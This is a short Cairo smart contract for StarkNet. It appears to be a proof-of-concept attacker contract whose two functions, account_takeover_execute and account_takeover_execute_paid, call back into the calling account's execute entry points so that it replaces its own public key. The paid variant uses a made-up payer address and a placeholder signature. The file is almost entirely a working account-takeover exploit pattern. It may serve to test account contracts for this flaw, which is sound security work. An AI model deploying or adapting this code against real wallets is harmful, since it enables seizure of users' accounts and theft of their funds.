%lang starknet

from starkware.starknet.common.syscalls import (
    call_contract,
    get_caller_address,
)
from starkware.cairo.common.cairo_builtins import HashBuiltin, SignatureBuiltin

from starkware.cairo.common.alloc import alloc

const EXECUTE = 617075754465154585683856897856256838130216341506379215893724690153393808813;
const EXECUTE_PAID = 539894541590502011955936893090601753255329655190787426849170212878825342151;
const SET_PUBLIC_KEY = 332268845949430430346835224631316185987738351560356300584998172574125127129;

@external
func account_takeover_execute{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    alloc_locals;
    let (caller) = get_caller_address();
    let (call_calldata: felt*) = alloc();

    // call_array
    assert call_calldata[0] = 1;
    assert call_calldata[1] = caller;
    assert call_calldata[2] = SET_PUBLIC_KEY;
    assert call_calldata[3] = 0;
    assert call_calldata[4] = 1;

    // calldata
    assert call_calldata[5] = 1;
    // new public key
    assert call_calldata[6] = 123;


    call_contract(
        contract_address=caller, function_selector=EXECUTE, calldata_size=7, calldata=call_calldata
    );

    return ();
}


@external
func account_takeover_execute_paid{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    alloc_locals;
    let (caller) = get_caller_address();
    let (call_calldata: felt*) = alloc();

    // payable call_array
    assert call_calldata[0] = 1;
    assert call_calldata[1] = caller;
    assert call_calldata[2] = SET_PUBLIC_KEY;
    assert call_calldata[3] = 98765432345678909876543456789; //arbitrary payer address
    assert call_calldata[4] = 0;
    assert call_calldata[5] = 1;

    // calldata
    assert call_calldata[6] = 1;
    // new public key
    assert call_calldata[7] = 123;

    // signature
    assert call_calldata[8] = 2;
    assert call_calldata[9] = 345678900987;
    assert call_calldata[10] = 36784290284249;


    call_contract(
        contract_address=caller, function_selector=EXECUTE_PAID, calldata_size=11, calldata=call_calldata
    );

    return ();
}